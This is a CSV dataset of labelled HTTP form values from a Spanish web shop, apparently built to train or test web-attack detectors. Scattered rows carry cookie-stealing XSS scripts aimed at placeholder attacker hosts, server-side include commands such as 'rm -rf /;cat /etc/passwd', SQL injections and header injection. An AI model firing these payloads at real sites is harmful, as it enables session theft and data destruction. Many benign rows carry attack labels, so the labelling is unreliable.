payload,category
entrar | nancie | %2B | on | Entrar HTTP/1.1,Command Injection
"entrar | nancie | ,r/�s'PED | on | Entrar HTTP/1.1",Command Injection
entrar | nancie | Pl0NTo | on | Entrar HTTP/1.1,Command Injection
paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,Encoded Attack
insertar | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | Pasar por caja HTTP/1.1,XSS
insertar | 2832 | Confirmar/ HTTP/1.1,Command Injection
insertar | 2832 | Pasar por caja HTTP/1.1,Command Injection
registro | vester1 | exudar | Ignacia | Mimendi Calvaroso | emperio@chinavende.gt | 79531407Y | O'donnell 9  | Cabana de Berganti�os | 21110 | Barcelona | 290553531661419 | Registrar HTTP/1.1,Command Injection
registro | vester1 | exudar | Ignacia | Mimendi Calvaroso | emperio@chinavende.gt | 79531407Y | O'donnell 9  | Cabana de Berganti�os | 21110 | Barcelona | 8418930773865835 | Registrar HTTP/1.1,Command Injection
"registro | emelia7 | e6u*ipolado | Gelsomino | Medio Bullones | radzum_noriega@alcantarapartners.hr | 15508885P | C/ Cadernera, 180, 5?C | B�veda | 06360 | La Rioja | 3331042207803695sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | Registrar HTTP/1.1",XSS
"registro | emelia7 | e6u*ipolado | Gelsomino | Medio Bullones | radzum_noriega@alcantarapartners.hr | 15508885P | C/ Cadernera, 180, 5?C | B�veda | 06360 | %2B | 3331042207803695 | Registrar HTTP/1.1",Command Injection
"registro | emelia7 | e6u*ipolado | Gelsomino | Medio Bullones | radzum_noriega@alcantarapartners.hr | 15508885P | C/ De La M*ussa*ra 165, 12F | B�veda | 06360 | La Rioja | 3331042207803695 | Registrar HTTP/1.1",Command Injection
"registro | emelia7 | e6u*ipolado | Gelsomino | Medio Bullones | radzum_noriega@alcantarapartners.hr | 15508885P | C/ Cadernera, 180, 5?C | B�veda | 06360 | La Rioja | 3331042207803695 | Registrar HTTP/1.1",Command Injection
2 | Vino .*?Rioja | 100 | 95 | A�adir al carrito HTTP/1.1,Command Injection
2 | Queso Manchego | 100 | 95 | A�adir al carrito HTTP/1.1,Command Injection
entrar | ?denise | pLaSMaDoR | on | Entrar HTTP/1.1,Command Injection
entrar | cicci | pLaSMaDoR | on | Entrar HTTP/1.1,Command Injection
%2B HTTP/1.1,Encoded Attack
%00 | 950 | Confirmar HTTP/1.1,Command Injection
insertar | 950 | Confirmar/ HTTP/1.1,Command Injection
insertar | 950 | Confirmar HTTP/1.1,Command Injection
"registro | dido | enmarch3tar | Bertilda | Deverdun | low.feliciano@azkara.sj | 19110618X | Prolongacion Algeciras 169,  | Navarredonda de Gredos | 18418 | Navarra | 1628195660765454 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1",SQLi
"registro | dido | i,nt32n/1773n'02a | Bertilda | Deverdun | low.feliciano@azkara.sj | 19110618X | Prolongacion Algeciras 169,  | Navarredonda de Gredos | 18418 | Navarra | 1628195660765454 | Registrar HTTP/1.1",Command Injection
"registro | dido | enmarch3tar | Bertilda | Deverdun | low.feliciano@azkara.sj | 19110618X | Prolongacion Algeciras 169,  | Navarredonda de Gredos | 18418 | Navarra | 1628195660765454 | Registrar HTTP/1.1",Command Injection
"registro | glancey | filol�gicamente | Yago | Bartra Bergu�o | kaminski@lola-lutscht.cf | 48258022C | Chalets De La Tierruca, 118 8-F%20 | Valls | 50691 | Ciudad Real | 8042027288739194 | Registrar HTTP/1.1",Command Injection
"registro | glancey | filol�gicamente | Yago | %7C | kaminski@lola-lutscht.cf | 48258022C | Chalets De La Tierruca, 118 8-F | Valls | 50691 | Ciudad Real | 8042027288739194 | Registrar HTTP/1.1",Command Injection
"registro | glancey | filol�gicamente | Yago | Bartra Bergu�o | kaminski@lola-lutscht.cf | 48258022C | Chalets De La Tierruca, 118 8-F | Erl.a | 50691 | Ciudad Real | 8042027288739194 | Registrar HTTP/1.1",Command Injection
"registro | glancey | filol�gicamente | Yago | Bartra Bergu�o | kaminski@lola-lutscht.cf | 48258022C | Chalets De La Tierruca, 118 8-F | Valls | 50691 | Ciudad Real | 8042027288739194 | Registrar HTTP/1.1",Command Injection
1 | Jam�n Ib�rico | 39/ | 43 | A�adir al carrito HTTP/1.1,Command Injection
entrar | doro | !FIlateliasessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | off | Entrar HTTP/1.1,Command Injection
entrar | 'INJECTED_PARAM | !FIlatelia | off | Entrar HTTP/1.1,Command Injection
entrar | r*e'gg+is | !FIlatelia | off | Entrar HTTP/1.1,Command Injection
entrar | doro | !FIlatelia | off | Entrar HTTP/1.1,Command Injection
Credenciales incorrectasany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A HTTP/1.1,Encoded Attack
insertar | 6851 | Confirmar+ HTTP/1.1,Command Injection
insertar | 6851 | Confirmar/ HTTP/1.1,Command Injection
insertar | 6851 | Confirmar HTTP/1.1,Command Injection
"registro | willy | c53p7t25064 | Aidano | Pujos Janeiro | eberle@baybay.tg | 85025185G | De La Vega 4,  | Casasimarro | 21340 | A Coru�abob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | 7642131917731646 | Registrar HTTP/1.1",Command Injection
"registro | willy | c53p7t25064 | <SCRIPT>alert(""Paros"");</SCRIPT> | Pujos Janeiro | eberle@baybay.tg | 85025185G | De La Vega 4,  | Casasimarro | 21340 | A Coru�a | 7642131917731646 | Registrar HTTP/1.1",XSS
"registro | willy | c53p7t25064 | Aidano | Pujos Janeiro | eberle@baybay.tg | 85025185G | De La Vega 4,  | Casasimarro | 21340 | A Coru�a | 841140437746594A | Registrar HTTP/1.1",Command Injection
"registro | willy | c53p7t25064 | Aidano | Pujos Janeiro | eberle@baybay.tg | 85025185G | De La Vega 4,  | Casasimarro | 21340 | A Coru�a | 7642131917731646 | Registrar HTTP/1.1",Command Injection
"registro | verene | espiritUAlizAci�N | Stella | Gim�nez Sans | degen@tecnoindomo.qa | 89878127S | Pasaje De Las Cig�e�as, 140 7-G | Moros | 17650 | Ourense | 915978839284380A | Registrar HTTP/1.1",Command Injection
"registro | verene | espiritUAlizAci�N | Stella | Gim�nez Sans | degen@tecnoindomo.qa | 89878127S | Pasaje De Las Cig�e�as, 140 7-G | Moros | 17650 | Ourense | 4769477830096089 | Registrar HTTP/1.1",Command Injection
3| | Vino Rioja | 85 | 4 | A�adir al carrito HTTP/1.1,Command Injection
3 | Vino Rioja | 85 | + | A�adir al carrito HTTP/1.1,Command Injection
3 | Ques+o Manchego | 85 | 4 | A�adir al carrito HTTP/1.1,Command Injection
3 | Vino Rioja | 85 | 4 | A�adir al carrito HTTP/1.1,Command Injection
any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | brooksba | papilla | on | Entrar HTTP/1.1,Command Injection
entrar | brooksba | foR'6ero | on | Entrar HTTP/1.1,Command Injection
entrar | brooksba | papilla | on | Entrar HTTP/1.1,Command Injection
"1""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",SQLi
? HTTP/1.1,Other
insertar | 4373 | Pasar por cajaAND 1=1 HTTP/1.1,Command Injection
insertar | 4373 | ? HTTP/1.1,Command Injection
insertar | 4373 | Confirmar/ HTTP/1.1,Command Injection
insertar | 4373 | Pasar por caja HTTP/1.1,Command Injection
registro | man*?g?um | 31g1ama6o | Andreas | Montells Callealt | gheorghiu-battaglia@sanchezgordo.bt | 72380388D | Calle De La Ciudad De Riga 184  | Holguera | 46669 | �vila | 4378749164701036 | Registrar HTTP/1.1,Command Injection
"registro | lorrayne | anofele6 | Neliana | Monllor Mascort | tsaganeas@mccomptables.my | 26431261Y | Calle Begonia 47,  | Recuenco, El | 44168 | Salamanca | 7168408229054610paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | Registrar HTTP/1.1",Command Injection
"registro | lorrayne | anofele6 | Neliana | Monllor Mascort | tsaganeas@mccomptables.my | 26431261Y | Calle Begonia 47,  | Recuenco, El | 44168 | Guad?ala/jar?a | 7168408229054610 | Registrar HTTP/1.1",Command Injection
"registro | lorrayne | anofele6 | Neliana | Monllor Mascort | tsaganeas@mccomptables.my | 26431261Y | Calle Begonia 47,  | Recuenco, El | 44168 | Salamanca | 7168408229054610 | Registrar HTTP/1.1",Command Injection
"1 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 85 | 15 | A�adir al carrito HTTP/1.1",SQLi
1 | Ques+o Manchego | 85 | 15 | A�adir al carrito HTTP/1.1,Command Injection
1 | Vino Rioja | 85 | 15 | A�adir al carrito HTTP/1.1,Command Injection
entrar%20 | sundar | rEsPEtOSA | on | Entrar HTTP/1.1,Command Injection
"entrar | sundar | /,g,Il | on | Entrar HTTP/1.1",Command Injection
entrar | sundar | rEsPEtOSA | on | Entrar HTTP/1.1,Command Injection
insertar | 9567 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 9567 | Pasar por caja HTTP/1.1,Command Injection
"registro | nafsika | malHeCHo | Jesumina | -P-i�a,na | cottrell@muchochinoenchina.tg | 44709161J | Navaluenga, 120 11?A | Or�soain | 21840 | Cuenca | 4344385269362154 | Registrar HTTP/1.1",Command Injection
"registro | nafsika | malHeCHo | Jesumina | Lizancos | cottrell@muchochinoenchina.tg | 44709161J | Navaluenga, 120 11?A | Or�soain | 21840 | Cuenca | 4344385269362154 | Registrar HTTP/1.1",Command Injection
"registro | | | 40fi6eres5a | Salustiano | Elguezabal Brot� | magarill@beljos.gi | 51095089Z | Zurbaran, 54,  | F�rez | 10613 | Salamanca | 8908099424894248 | Registrar HTTP/1.1",Command Injection
"registro | hines | 40fi6eres5a | Salustiano | -Bola�o Dom�nech | magarill@beljos.gi | 51095089Z | Zurbaran, 54,  | F�rez | 10613 | Salamanca | 8908099424894248 | Registrar HTTP/1.1",Command Injection
"registro | hines | 40fi6eres5a | Salustiano | Elguezabal Brot� | magarill@beljos.gi | 51095089Z | Zurbaran, 54,  | F�rez | 10613 | Salamanca | 8908099424894248 | Registrar HTTP/1.1",Command Injection
3 | Vino Rioja | | | 32 | A�adir al carrito HTTP/1.1,Command Injection
1/ | Vino Rioja | 85 | 32 | A�adir al carrito HTTP/1.1,Command Injection
3 | Vino Rioja | 85 | 32 | A�adir al carrito HTTP/1.1,Command Injection
"entrar | espinosa | candado | off','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1",SQLi
"entrar | espinosa | candado | <!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1",SQLi
entrar | espinosa | candado | off/ | Entrar HTTP/1.1,Command Injection
entrar | espinosa | candado | off | Entrar HTTP/1.1,Command Injection
any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,Encoded Attack
insertar | 2373 | Confirmar/ HTTP/1.1,Command Injection
"registro | sorkin | engordadora | Shakira | Mej�a Ferr�s | boudaoudi-griffeth@muchacha.com.dz | 13074085B | C/ Virgen De La Paloma 31 12?H | Pedroso de la Armu�a, El | 03277 | Soria | 2500333938712142 | Registrarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1",Command Injection
"registro | sorkin | engordadora | Shakira | Mej�a Ferr�s | boudaoudi-griffeth@muchacha.com.dz | 13074085B | C/ Virgen De La Paloma 31 12?H | Pedroso de la Armu�a, El | 03277 | ?�.vila | 2500333938712142 | Registrar HTTP/1.1",Command Injection
"registro | sorkin | engordadora | Shakira | Mej�a Ferr�s | boudaoudi-griffeth@muchacha.com.dz | 13074085B | C/ Virgen De La Paloma 31 12?H | Pedroso de la Armu�a, El | 03277 | Soria | 2500333938712142 | Registrar HTTP/1.1",Command Injection
"registro | corissa | cipresino | Cenobio | La Ringa Chinchilla | plate@pecher.mx | 16052504E | Torres Quevedo, 143 10?B | Casas de Juan N��ez | 31480 | %3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | 1974630082144363 | Registrar HTTP/1.1",Command Injection
"registro | corissa | cipresino | Cenobio | La Ringa Chinchilla | plate@pecher.mx | 16052504E | Torres Quevedo, 143 10?B | Casas de Juan N��ez | 4387A | Madrid | 1974630082144363 | Registrar HTTP/1.1",Command Injection
"registro | corissa | cipresino | Cenobio | La Ringa Chinchilla | plate@pecher.mx | 16052504E | Torres Quevedo, 143 10?B | Casas de Juan N��ez | 31480 | Madrid | 1974630082144363 | Registrar HTTP/1.1",Command Injection
3 | Jam�n' Ib�ric-'o | 39 | 49 | A�adir al carrito HTTP/1.1,Command Injection
3 | Vino Rioja | 39 | 49 | A�adir al carrito HTTP/1.1,Command Injection
entrar | riccitel | aprisCar | on | Entrar%20 HTTP/1.1,Command Injection
entrar | riccitel | aprisCar | %7C | Entrar HTTP/1.1,Command Injection
"entrar | riccitel | p20'99�,fi'ca | on | Entrar HTTP/1.1",Command Injection
entrar | riccitel | aprisCar | on | Entrar HTTP/1.1,Command Injection
insertar | 2352 | Confirmar%3F HTTP/1.1,Command Injection
insertar | 2352 | ' AND '1'='1 HTTP/1.1,Command Injection
insertar | 2352 | Confirmar/ HTTP/1.1,Command Injection
insertar | 2352 | Confirmar HTTP/1.1,Command Injection
"registro | houston | 8n885rado | Salvino | Ivanco Casola | galli_amagula@hotelesjerez.lc | 53532197L | Calle Memorias, 21, sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | Artesa de Segre | 05571 | Burgos | 3983408909914725 | Registrar HTTP/1.1",Command Injection
registro | houston | 8n885rado | Salvino | Ivanco Casola | galli_amagula@hotelesjerez.lc | 53532197L | %00 | Artesa de Segre | 05571 | Burgos | 3983408909914725 | Registrar HTTP/1.1,Command Injection
"registro | houston | 8n885rado | Salvino | Ivanco Casola | galli_amagula@hotelesjerez.lc | 53532197L | Call+e Gil De On*ta�on, S*/N,  | Artesa de Segre | 05571 | Burgos | 3983408909914725 | Registrar HTTP/1.1",Command Injection
"registro | houston | 8n885rado | Salvino | Ivanco Casola | galli_amagula@hotelesjerez.lc | 53532197L | Calle Memorias, 21,  | Artesa de Segre | 05571 | Burgos | 3983408909914725 | Registrar HTTP/1.1",Command Injection
"registro | lerch | 5elas2omat�2eo | Alcira | Forn�s Kohls | busch@show.nom.naany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 71246547E | Francisco Ni�o, 100  | Marazoleja | 19144 | Valladolid | 2373775613776198 | Registrar HTTP/1.1",Command Injection
"registro | lerch | 5elas2omat�2eo | Alcira | Forn�s Kohls | busch@show.nom.na | 71246547E | Francisco Ni�o, 100  | Marazoleja | 19144 | Valladolid | 2373775613776198 | "" AND ""1""=""1 HTTP/1.1",Command Injection
"registro | lerch | 5elas2omat�2eo | Alcira | Forn�s Kohls | cawthorn@queinvento.@sd | 71246547E | Francisco Ni�o, 100  | Marazoleja | 19144 | Valladolid | 2373775613776198 | Registrar HTTP/1.1",Command Injection
"registro | lerch | 5elas2omat�2eo | Alcira | Forn�s Kohls | busch@show.nom.na | 71246547E | Francisco Ni�o, 100  | Marazoleja | 19144 | Valladolid | 2373775613776198 | Registrar HTTP/1.1",Command Injection
2 | Jam�n Ib�rico | 39/ | 65 | A�adir al carrito HTTP/1.1,Command Injection
entrar | befanis | PiSoneAR | off | Entrar%7C HTTP/1.1,Command Injection
+ | befanis | PiSoneAR | off | Entrar HTTP/1.1,Command Injection
entrar | befanis | PiSoneAR | on/ | Entrar HTTP/1.1,Command Injection
entrar | befanis | PiSoneAR | off | Entrar HTTP/1.1,Command Injection
insertar | 8083 | Confirmarany%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,Command Injection
insertar | 8083 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 8083 | Confirmar HTTP/1.1,Command Injection
"registro | carolyne | 1�5i7am41t0 | Ram�n | Chambueta Deben | mangini@cubiertoscbb.an | 10042805Q | Calle Falconera, 173  | Trefacio | 31227Set-cookie%3A+Tamper%3D1041264011025374727 | Salamanca | 1976494121699035 | Registrar HTTP/1.1",Command Injection
"registro | carolyne | 1�5i7am41t0 | Ram�n | Chambueta Deben | <SCRIPT>alert(""Paros"");</SCRIPT> | 10042805Q | Calle Falconera, 173  | Trefacio | 31227 | Salamanca | 1976494121699035 | Registrar HTTP/1.1",XSS
"registro | carolyne | 1�5i7am41t0 | Ram�n | Chambueta Deben | mangini@cubiertoscbb.an | 10042805Q | Isaa+c Peral 30,*+  | Trefacio | 31227 | Salamanca | 1976494121699035 | Registrar HTTP/1.1",Command Injection
"registro | carolyne | 1�5i7am41t0 | Ram�n | Chambueta Deben | mangini@cubiertoscbb.an | 10042805Q | Calle Falconera, 173  | Trefacio | 31227 | Salamanca | 1976494121699035 | Registrar HTTP/1.1",Command Injection
"Vaciar carrito','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",SQLi
"registro | crickard | chofe | Irene | Blancas Sol�rzano | billingsley@yksoluap.sr | 44614622G | Gibraltar, 160  | Cogollos | 10189 | Cuenca | 2593497468791354' DELETE FROM USERS | Registrar HTTP/1.1",Command Injection
"registro | crickard | chofe | -+Va+lfredo | Blancas Sol�rzano | billingsley@yksoluap.sr | 44614622G | Gibraltar, 160  | Cogollos | 10189 | Cuenca | 2593497468791354 | Registrar HTTP/1.1",Command Injection
2 | ' DELETE FROM USERS | 39 | 63 | A�adir al carrito HTTP/1.1,Command Injection
2 | Jam�n Ib�rico | 100/ | 63 | A�adir al carrito HTTP/1.1,Command Injection
2 | Jam�n Ib�rico | 39 | 63 | A�adir al carrito HTTP/1.1,Command Injection
entrar | +jay | pre7u5t05a | off | Entrar HTTP/1.1,Command Injection
entrar | ker | pre7u5t05a | off | Entrar HTTP/1.1,Command Injection
2AND 1=1 HTTP/1.1,Other
any%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,Encoded Attack
insertar | 5500 | Pasar por caja/ HTTP/1.1,Command Injection
insertar | 5500 | Pasar por caja HTTP/1.1,Command Injection
"registro | soliman | 85r7a4c2 | Shiirly | Margarit Gallardo | asther@ringringrent.bj | 718619A7P | Navalafuente, 42  | Santa Cruz de Pinares | 37510 | Zaragoza | 6014094757095594 | Registrar HTTP/1.1",Command Injection
"registro | soliman | 85r7a4c2 | Shiirly | Margarit Gallardo | asther@ringringrent.bj | 20514170X | Navalafuente, 42  | Santa Cruz de Pinares | 37510 | Zaragoza | 6014094757095594 | Registrar HTTP/1.1",Command Injection
"registro | fallows | hidrost�t.ica | Florentin | Diosdado Pi�eiro | jones-davis@cincocolores.cf | 68096192T | Calle San Sebastian 38,  | Hontecillas | 09292 | Burgos | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Registrar HTTP/1.1",XSS
"registro | fallows | hidrost�t.ica | Florentin | Diosdado Pi�eiro | jones-davis@cincocolores.cf | 68096192T | Calle San Sebastian 38,  | Hontecillas | 09292 | V?allado*+lid | 7245939027120885 | Registrar HTTP/1.1",Command Injection
"registro | fallows | hidrost�t.ica | Florentin | Diosdado Pi�eiro | jones-davis@cincocolores.cf | 68096192T | Calle San Sebastian 38,  | Hontecillas | 09292 | Burgos | 7245939027120885 | Registrar HTTP/1.1",Command Injection
1 | Queso Manchego | 39 | 18 | A�adir al carrito%2B HTTP/1.1,Command Injection
1 | Queso Manchego | ' DELETE FROM USERS | 18 | A�adir al carrito HTTP/1.1,Command Injection
1 | Jam�n' Ib�ric-'o | 39 | 18 | A�adir al carrito HTTP/1.1,Command Injection
1 | Queso Manchego | 39 | 18 | A�adir al carrito HTTP/1.1,Command Injection
entrar%2B | meridith | oidorA | on | Entrar HTTP/1.1,Command Injection
entrar | meridith | oidorA | on/ | Entrar HTTP/1.1,Command Injection
entrar | meridith | oidorA | on | Entrar HTTP/1.1,Command Injection
1paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,Encoded Attack
"','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",SQLi
"Credenciales incorrectas<!--#include file=""archivo_secreto"" --> HTTP/1.1",SQLi
insertar | 1328any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | Pasar por caja HTTP/1.1,Command Injection
insertar | 1328 | Confirmar/ HTTP/1.1,Command Injection
insertar | 1328 | Pasar por caja HTTP/1.1,Command Injection
"registro | kevyn | a6el1Ido | Saba | Ache | davray.chayevsky4@sierradealcaraz.um | 02401008S | Paseo Chil 19, 9-H | Sotodosos | 05115 | Valencia | 638571027216087 | Registrar HTTP/1.1",Command Injection
"registro | kevyn | a6el1Ido | Saba | Ache | davray.chayevsky4@sierradealcaraz.um | 02401008S | Paseo Chil 19, 9-H | Sotodosos | 05115 | Valencia | 2281646357474752 | Registrar HTTP/1.1",Command Injection
Vaciar carrito@40 HTTP/1.1,Other
"registro | slaby | 3a91io | Niseas | Paiva Romera | owens@provider.com.br | 74056042K | Aigua Marina 91, %3F | Chercos | 40421 | Segovia | 8044294456559903 | Registrar HTTP/1.1",Command Injection
"sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | slaby | 3a91io | Niseas | Paiva Romera | owens@provider.com.br | 74056042K | Aigua Marina 91,  | Chercos | 40421 | Segovia | 8044294456559903 | Registrar HTTP/1.1",Command Injection
"registro | slaby | 3a91io | Niseas | Paiva Romera | owens@provider.com.br | 74056042K | Aigua Marina 91,  | Chercos | 40421 | Segovia | 8044294456559903 | Registrar HTTP/1.1",Command Injection
');waitfor delay '0:0:15';-- | Vino Rioja | 100 | 17 | A�adir al carrito HTTP/1.1,SQLi
1 | Vino .*?Rioja | 100 | 17 | A�adir al carrito HTTP/1.1,Command Injection
1 | Vino Rioja | 100 | 17 | A�adir al carrito HTTP/1.1,Command Injection
entrar | dagmar | t8ipoy | off | Entrar HTTP/1.1,Command Injection
insertar | 6715bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Pasar por caja HTTP/1.1,XSS
insertar | 'INJECTED_PARAM | Pasar por caja HTTP/1.1,Command Injection
insertar | 6715 | Confirmar/ HTTP/1.1,Command Injection
insertar | 6715 | Pasar por caja HTTP/1.1,Command Injection
"registro | payroll8 | ePanORToSIS | Umberto | Latorre Giral | tarron-calleta@xavipetit.nu | 39712087B | Plza. Mar*ina Es+*pa�ola, 38, 8-D | Vici�n | 45111 | Palencia | 4738747991462100 | Registrar HTTP/1.1",Command Injection
registro | payroll8 | ePanORToSIS | Umberto | Latorre Giral | tarron-calleta@xavipetit.nu | 39712087B | Fontilles 137 4?G | Vici�n | 45111 | Palencia | 4738747991462100 | Registrar HTTP/1.1,Command Injection
"'INJECTED_PARAM | gordy | malcomida | Cebele | Palah� Cabezas | capoliccio@almeriastella.jo | 94088087D | C/ Dels Escales Del Miracle, 37, 7-F | Arbanc�n | 31229 | Cantabria | 7224824987028849 | Registrar HTTP/1.1",Command Injection
"registro | gordy | malcomida | Cebele | Palah� Cabezas | capoliccio@almeriastella.jo | 94088087D | C/ Dels Escales Del Miracle, 37, 7-F | Arbanc�n | 31229 | Cantabria | 229846231825930 | Registrar HTTP/1.1",Command Injection
"registro | gordy | malcomida | Cebele | Palah� Cabezas | capoliccio@almeriastella.jo | 94088087D | C/ Dels Escales Del Miracle, 37, 7-F | Arbanc�n | 31229 | Cantabria | 7224824987028849 | Registrar HTTP/1.1",Command Injection
"3 | Queso Manchego | 85 | 54','0','0');waitfor delay '0:0:15';-- | A�adir al carrito HTTP/1.1",SQLi
entrar | wilken | r5pa2el0s | off/ | Entrar HTTP/1.1,Command Injection
entrar | wilken | r5pa2el0s | on | Entrar HTTP/1.1,Command Injection
1' DELETE FROM USERS HTTP/1.1,Other
insertar | 6543 | Confirmar/ HTTP/1.1,Command Injection
insertar | 6543 | Confirmar HTTP/1.1,Command Injection
"registro | rygwalsk | ve50able | Francisco | Pallares Milara%00 | gozzi@encuentrodominios.at | 51556666G | Pl. Banco 196, 7G | Corrales | 03187 | La Rioja | 3169451354292215 | Registrar HTTP/1.1",Command Injection
"registro | rygwalsk | ve50able | Francisco | Pallares Milara | gozzi@encuentrodominios.at | 51556666G | Pl. Banco 196, 7G | Corrales | 03187 | La Rioja | 3169451354292215 | 'INJECTED_PARAM HTTP/1.1",Command Injection
"registro | rygwalsk | ve50able | Francisco | Pallares Milara | gozzi@encuentrodominios.at | 51556666G | Pl. Banco 196, 7G | Corrales | 03187 | ?T.ole/do | 3169451354292215 | Registrar HTTP/1.1",Command Injection
"registro | rygwalsk | ve50able | Francisco | Pallares Milara | gozzi@encuentrodominios.at | 51556666G | Pl. Banco 196, 7G | Corrales | 03187 | La Rioja | 3169451354292215 | Registrar HTTP/1.1",Command Injection
Vaciar carritoparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,Encoded Attack
"registro | tarra | bienh6dado | Idalia | Pozo Carbot | dafinescu@saavedradiaz.gf | 43841813H"" AND ""1""=""1 | Avinguda Marques De Montroig 110 11-A | Nov�s | 46370 | Zamora | 3085190282266683 | Registrar HTTP/1.1",Command Injection
registro | tarra | bienh6dado | Idalia | Pozo Carbot | dafinescu@saavedradiaz.gf | 43841813H | Avinguda Marques De Montroig 110 11-A | Nov�s | 46370 | Zamora | 3085190282266683 | %3F HTTP/1.1,Command Injection
registro | tarra | bienh6dado | Idalia | Pozo Carbot | bes@s@enyei@@webhut.md | 43841813H | Avinguda Marques De Montroig 110 11-A | Nov�s | 46370 | Zamora | 3085190282266683 | Registrar HTTP/1.1,Command Injection
registro | tarra | bienh6dado | Idalia | Pozo Carbot | dafinescu@saavedradiaz.gf | 43841813H | Avinguda Marques De Montroig 110 11-A | Nov�s | 46370 | Zamora | 3085190282266683 | Registrar HTTP/1.1,Command Injection
3 | @40 | 39 | 33 | A�adir al carrito HTTP/1.1,Command Injection
3 | Ques+o Manchego | 39 | 33 | A�adir al carrito HTTP/1.1,Command Injection
3 | Queso Manchego | 39 | 33 | A�adir al carrito HTTP/1.1,Command Injection
entrar | tsong-li0 | 4oM4a1rO173To | on%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | Entrar HTTP/1.1,Command Injection
entrar | 'alev | 4oM4a1rO173To | on | Entrar HTTP/1.1,Command Injection
